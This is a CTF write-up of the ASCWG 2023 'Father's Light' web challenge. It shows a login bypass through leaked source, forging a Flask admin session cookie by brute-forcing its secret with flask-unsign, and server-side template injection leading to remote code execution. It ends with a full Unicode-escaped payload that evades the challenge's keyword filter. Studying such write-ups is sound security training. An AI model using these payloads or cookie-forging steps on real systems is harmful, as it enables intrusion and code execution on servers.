---
title: ASCWG 2023 - Father's Light SSTI to RCE
image:
    path: /assets/images/ascwg.jpg
date: 2023-08-07 20:00:00 +0800
categories: CTF
description: "ASCWG 2023 web challenge"
tags: [flask, login-bypass, ssti, rce]
toc: true
---


# Father’s Light Info

## Level: Medium

## Points: 600

## Description :

> Enter the enigmatic realm of "Father of Light" Unleash your skills, explore hidden paths, and uncover the depths of mysterious creations. Will you emerge as the champion? Dare to unravel the enigma.
> 
---


# Login Bypass

- there is  a login page in /login, redirected to after opening the link
- I tried to bypass the login using SQL Injection, but the server responded with `Do You think you can Hack My Applicationnnnnnnn!!!`, I’ve tried many things like requesting `/login~` to expose the backend code and sending unexpected input, sending the username or the password as an array will make an INTERNAL SERVER ERROR and expose useful information
- part of the response
    
    ```http
    HTTP/1.1 500 INTERNAL SERVER ERROR
    Server: Werkzeug/2.3.6 Python/3.11.2
    Date: Fri, 04 Aug 2023 17:04:52 GMT
    Content-Type: text/html; charset=utf-8
    Content-Length: 18283
    Connection: close
    
    <div class="source "><pre class="line before"><span class="ws"></span>@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])</pre>
    <pre class="line before"><span class="ws"></span>@limiter.limit(&#34;20 per minute&#34;)</pre>
    <pre class="line before"><span class="ws"></span>def login():</pre>
    <pre class="line before"><span class="ws">    </span>if request.method == &#39;POST&#39;:</pre>
    <pre class="line before"><span class="ws">        </span>username = request.form[&#39;username&#39;]</pre>
    <pre class="line current"><span class="ws">        </span>password = request.form[&#39;password&#39;]
    <span class="ws">        </span>           ^^^^^^^^^^^^^^^^^^^^^^^^</pre>
    <pre class="line after"><span class="ws">        </span>pattern = r&#39;select|union|\&#39;|&#34;|or|and|#|--|=| |1=1&#39;</pre>
    <pre class="line after"><span class="ws">        </span>if re.search(pattern, username):</pre>
    <pre class="line after"><span class="ws">            </span>flash(&#39;Do You think you can Hack My Applicationnnnnnnn!!!&#39;, &#39;error&#39;)</pre>
    <pre class="line after"><span class="ws">            </span>return render_template(&#39;login.html&#39;, error=True)</pre>
    <pre class="line after"><span clas=s"ws">        </span>elif username == &#39;admin&#39; and password == &#39;password&#39;:</pre></div>
    </div>
    ```
    
- Beautified
    
    ```python
    @app.route('/login', methods=['GET', 'POST'])
    @limiter.limit("20 per minute")
    def login():
        if request.method == 'POST':
            username = request.form['username']
            password = request.form['password']
            pattern = r'select|union|\'|"|or|and|#|--|=| |1=1'
            if re.search(pattern, username):
                flash('Do You think you can Hack My Applicationnnnnnnn!!!', 'error')
                return render_template('login.html', error=True)
            elif username == 'admin' and password == 'password':
    ```
    
- From the response, we know the following:
    - it’s a Flask app
    - admin:password is a valid credential
    - the pattern is `pattern = r'select|union|\'|"|or|and|#|--|=| |1=1'`
- we used the valid credentials to log in (admin:password)
- login response

```http
HTTP/1.1 302 FOUND
Server: Werkzeug/2.3.6 Python/3.11.2
Date: Fri, 04 Aug 2023 17:00:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 197
Location: /user
Vary: Cookie
Set-Cookie: session=.eJyrVsosjk9Myc3MU7JKS8wpTtVRKi1OLYrPTFGyUjI0M1KC8PMSc1OBAhCFtQDj5xGP.ZM0uxw.Z1agEdPmnggokr26qAjRfzOkn9k; HttpOnly; Path=/
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/user">/user</a>. If not, click the link.
```
    
- we redirected to `/user`, there is nothing to do with it, no functionalities.
    
    ![Untitled](/assets/images/ASCWG-Fathers-Light/Untitled.png)
    

# Regular user to Admin user

- we noticed in the last response that the server sent a session, flask session 🤔hmm, did you think of what I thought, we can decode this session token using `flask-unsign` and brute force the secret to sign a new modified one. Easy, right?
    
    ```http
    Set-Cookie: session=.eJyrVsosjk9Myc3MU7JKS8wpTtVRKi1OLYrPTFGyUjI0M1KC8PMSc1OBAhCFtQDj5xGP.ZM0uxw.Z1agEdPmnggokr26qAjRfzOkn9k; HttpOnly; Path=/
    ```
    
- decoding the cookie
    
    ```bash
    ┌──(juba㉿legion-5-kali-vm)-[~]
    └─$ flask-unsign --decode --cookie ".eJyrVsosjk9Myc3MU7JKS8wpTtVRKi1OLYrPTFGyUjI0M1KC8PMSc1OBAhCFtQDj5xGP.ZM0uxw.Z1agEdPmnggokr26qAjRfzOkn9k"                                     
    
    {'is_admin': False, 'user_id': '162', 'username': 'admin'}
    ```
    
- brute-force the secret
    
    ```bash
    ┌──(juba㉿legion-5-kali-vm)-[~]
    └─$ flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie ".eJyrVsosjk9Myc3MU7JKS8wpTtVRKi1OLYrPTFGyUjI0M1KC8PMSc1OBAhCFtQDj5xGP.ZM0uxw.Z1agEdPmnggokr26qAjRfzOkn9k" --no-literal-eval     
    
    [*] Session decodes to: {'is_admin': False, 'user_id': '162', 'username': 'admin'}
    [*] Starting brute-forcer with 8 threads..
    [+] Found secret key after 30080 attempts
    b'amorlove'
    ```
    
- sign a new modified cookie
    
    ```bash
    ┌──(juba㉿legion-5-kali-vm)-[~]
    └─$ flask-unsign --sign --secret "amorlove" --cookie "{'is_admin': True, 'user_id': '1', 'username': 'admin'}"                                                                                             
    .eJyrVsosjk9Myc3MU7IqKSpN1VEqLU4tis9MUbJSMlSC8PISc1OBXIiqWgC2jxDc.ZNEv2A.7Ka4PghgjAOmybhsH0KedhmuqtY
    ```
    

![Untitled](/assets/images/ASCWG-Fathers-Light/Untitled%201.png)

- after editing the cookie, we became an Admin user

![Untitled](/assets/images/ASCWG-Fathers-Light/Untitled%202.png)

# SSTI

- after fuzzing, we found `/dashboard`
    
    ![Untitled](/assets/images/ASCWG-Fathers-Light/Untitled%203.png)
    

## SSTI PoC

- we tried to exploit SSTI in all the input fields (name, email, and post_content), but only the name is vulnerable to SSTI, firstly we tried `2*2` in double curly braces, I’m so sorry for not using `7*7`, I feel like I broke the rules 😅
    
    ![Untitled](/assets/images/ASCWG-Fathers-Light/Untitled%204.png)
    

[https://youtu.be/SN6EVIG4c-0?t=562](https://youtu.be/SN6EVIG4c-0?t=562)



## Crafting payload

- we tried many payloads, but there are many characters blocked, like __ and others, to get the flag you could just send {{ config }} and URL encode config, but this is not what I did, I got an RCE, let’s dive in
- I found that the server blocks `__class__` but does not block its UTF-32, so I tough that we can use the following payload to get an RCE
- we can use the following payload to get an RCE
    
    ```python
    ''.__class__.__mro__[1].__subclasses__()[207].__init__.__globals__['sys'].modules['os'].popen('echo RCE').read()
    ```
    
- Payload Explanation
    
    ![Screenshot_20230807_214836.png](/assets/images/ASCWG-Fathers-Light/Screenshot_20230807_214836.png)
    
- there is a problem, the server blocks `.`, don’t worry, we can bypass it using `[]`

```bash

''.__class__.__mro__[1].__subclasses__()[index_of_catch_warnings].__init__.__globals__['sys'].modules['os'].popen('echo RCE').read()
''['__class__']['__mro__'][1]['__subclasses__'][index_of_catch_warnings]['__init__']['__globals__']['sys']['modules']['os']['popen']('id')['read']()

```

## finding `catch_warnings` index

by sending: 
```python
''['__class__']['__mro__'][1]['__subclasses__']
``` 
in UTF-32 like the following:

```python
''['\U0000005F\U0000005F\U00000063\U0000006c\U00000061\U00000073\U00000073\U0000005F\U0000005F']['\U0000005f\U0000005f\U0000006d\U00000072\U0000006f\U0000005f\U0000005f'][1]['\U0000005f\U0000005f\U00000073\U00000075\U00000062\U00000063\U0000006c\U00000061\U00000073\U00000073\U00000065\U00000073\U0000005f\U0000005f']()
```

 we will get a list of the subclasses, convert it from HTML entity and remove other HTML lines, and separate each class in a like in sublime (CTRL+F → `,`  and ALT+Enter then Enter), we can find that catch_warnings in line 208, decrementing it by one because python list counts from zero not one like sublime lines, `catch_warnings` index is 207

we will get

![Untitled](/assets/images/ASCWG-Fathers-Light/Untitled%205.png)

![Screenshot_20230807_215824.png](/assets/images/ASCWG-Fathers-Light/Screenshot_20230807_215824.png)

- make sure that’s the right index
    
    ![Untitled](/assets/images/ASCWG-Fathers-Light/Untitled%206.png)
    
    - great, now we can proceed with our exploitation

## getting RCE

- we found that ‘`popen`’ and ‘`read`’ is blocked, so we converted it to UTF-32 too

![Untitled](/assets/images/ASCWG-Fathers-Light/Untitled%207.png)

- executing `ls`

![Untitled](/assets/images/ASCWG-Fathers-Light/Untitled%208.png)

## Getting the flag

![Untitled](/assets/images/ASCWG-Fathers-Light/Untitled%209.png)

final payload without:

```python

''['\U0000005F\U0000005F\U00000063\U0000006c\U00000061\U00000073\U00000073\U0000005F\U0000005F']['\U0000005f\U0000005f\U0000006d\U00000072\U0000006f\U0000005f\U0000005f'][1]['\U0000005f\U0000005f\U00000073\U00000075\U00000062\U00000063\U0000006c\U00000061\U00000073\U00000073\U00000065\U00000073\U0000005f\U0000005f']()[207]['\U0000005f\U0000005f\U00000069\U0000006e\U00000069\U00000074\U0000005f\U0000005f']['\U0000005f\U0000005f\U00000067\U0000006c\U0000006f\U00000062\U00000061\U0000006c\U00000073\U0000005f\U0000005f']['sys']['modules']['os']['\U00000070\U0000006f\U00000070\U00000065\U0000006e']('cat+app.py')['\U00000072\U00000065\U00000061\U00000064']()

```

---

Thanks for reading, feel free to DM [me](https://www.linkedin.com/in/juba0x00), Have a great day 🌹